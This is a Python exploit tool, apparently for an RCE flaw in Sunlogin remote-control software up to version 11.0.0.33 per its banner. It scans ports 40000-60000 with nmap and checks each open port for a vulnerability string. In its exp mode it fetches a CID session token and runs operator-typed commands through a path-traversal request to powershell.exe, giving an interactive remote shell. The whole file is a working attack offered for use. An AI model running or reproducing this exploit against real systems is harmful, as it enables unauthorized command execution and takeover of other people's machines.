import requests
import nmap
import colorama as ca
from argparse import ArgumentParser


def postScan(ip, port):
    nm = nmap.PortScanner()
    print("[-] 正在扫描存活端口。。。")
    try:
        result = nm.scan(hosts=ip, arguments='-T4 -p %s' % port)
        OpenPort = result["scan"][ip]["tcp"]
        PortList = list(OpenPort.keys())  # 获取开放端口返回列表
        print("[-] 开放端口列表:", PortList)
        return PortList
    except KeyError:
        print("[-] 端口开放信息返回值为空")


def poc(ip, port):
    try:
        response = requests.get(url="http://%s:%s/" % (ip, port), timeout=0.5).text
        if "Verification failure" in response:
            print("\033[1;31m[+]\033[1;37m %s端口可能存在RCE漏洞！" % port)
        else:
            pass
    except:
        pass
        print("[-] %s端口不存在RCE漏洞" % port)


def exp(ip, port):
    # 输出端
    CmdData = input("Break> ")
    if CmdData == "exit":
        exit("bye")
    elif CmdData == "":
        pass
    else:
        try:
            # 获取CID值
            CIDGet = requests.get(url="http://%s:%s/cgi-bin/rpc?action=verify-haras" % (ip, port)).json()
            Cid = CIDGet["verify_string"]

            burp0_url = "http://%s:%s" % (ip, port) + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows" \
                                                      "%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+" + CmdData
            # burp0_url = "http://%s:%s" % (ip, port) + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows" \
            #                                           "%2Fsystem32%2F" + CmdData
            burp0_cookies = {"CID": Cid}
            burp0_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                "Accept-Encoding": "gzip"}

            # 输出命令执行结果
            response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
            response.encoding = "gbk"
            print(response.text)
        except:
            print("[-] 命令执行失败，请重试或exit退出")


if __name__ == '__main__':
    arg = ArgumentParser(description="python3 main.py -h 127.0.0.1")
    arg.add_argument('-u', help='指定ip', dest='host', type=str)
    arg.add_argument('-p', help='指定端口或指定扫描端口，默认40000-60000', dest='port', type=str)
    arg.add_argument('-e', help='使用EXP模块', action='store_true')
    argv = arg.parse_args()
    ca.init(autoreset=True)
    print('''
     ___  __  __  _  _  __    _____  ___  ____  _  _       ____  _____  ___ 
    / __)(  )(  )( \( )(  )  (  _  )/ __)(_  _)( \( )     (  _ \(  _  )/ __)
    \__ \ )(__)(  )  (  )(__  )(_)(( (_-. _)(_  )  (  ___  )___/ )(_)(( (__ 
    (___/(______)(_)\_)(____)(_____)\___/(____)(_)\_)(___)(__)  (_____)\___)

    影响版本：<= 11.0.0.33
    Autor：Break
    ''')
    if argv.e:
        print('\033[1;33m[!]\033[1;37m正在执行命令模式')
        print('\033[1;33m[!]\033[1;37m输入exit退出命令模式')
        while True:
            try:
                exp(argv.host, argv.port)
            except KeyboardInterrupt:
                exit(0)

    elif argv.host:
        PortNum = "40000-60000"
        if argv.port:
            PortNum = argv.port
        port_list = postScan(argv.host, PortNum)
        print("\033[1;33m[!]\033[1;37m 正在检测端口。。。")
        for x in port_list:
            poc(argv.host, x)

    else:
        print("\033[1;31m[!] -h查看帮助")
